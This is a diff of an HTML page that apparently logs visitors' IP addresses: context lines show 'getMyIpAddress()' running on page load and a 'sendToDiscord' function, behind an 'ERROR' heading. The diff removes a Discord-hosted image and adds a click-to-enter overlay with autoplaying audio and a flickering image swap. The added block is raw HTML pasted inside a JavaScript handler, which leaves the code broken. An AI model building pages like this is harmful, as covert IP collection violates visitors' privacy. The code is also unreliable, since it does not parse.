@@ -9,7 +9,6 @@
 <div id="result"></div>
 
 <!-- Add a title and an image -->
-<img src="https://cdn.discordapp.com/attachments/1321729826578763870/1322064016213934121/image.png?ex=676f8390&is=676e3210&hm=b6eea6b14f2ad193b8dec949cd7d3c1b4d2bdb1caa359107a96c3428469f4dd5&" alt="Custom Image" style="max-height: 300px; width: auto;">
 <h2>ERROR</h2>
 
 <div id="ipResult"></div>
@@ -93,6 +92,40 @@ function sendToDiscord(data, hexCode, imageUrl) {
 
 document.addEventListener("DOMContentLoaded", function() {
     getMyIpAddress();
+
+    <body>
+        <div id="black"><button id="enter">Click to Enter Site</button></div>
+    <img id="jas" src="jas.png">
+
+    
+    <audio id="music" src="sound.mp3" autoplay loop muted></audio>
+    <script async defer>
+        const black = document.getElementById('black');
+        const player = document.getElementById('music');
+
+        const swap = async () => {
+            const img = document.getElementById('jas');
+            img.src = 'jas.png'
+            await new Promise(r => setTimeout(r, 100));
+            img.src = 'jas2fdgfdgd.png'
+            timer = setTimeout(swap, 200);
+        }
+
+        const buttonEvent = () => {
+            const btn = document.getElementById('enter');
+            btn.addEventListener("click", () => {
+                const black = document.getElementById('black');
+                const player = document.getElementById('music');
+                black.style.visibility = 'hidden'
+                player.muted = false;
+                player.play();
+            })
+
+        }
+        buttonEvent()
+
+
+        let timer = setTimeout(swap, 200);
 });
 </script>
 
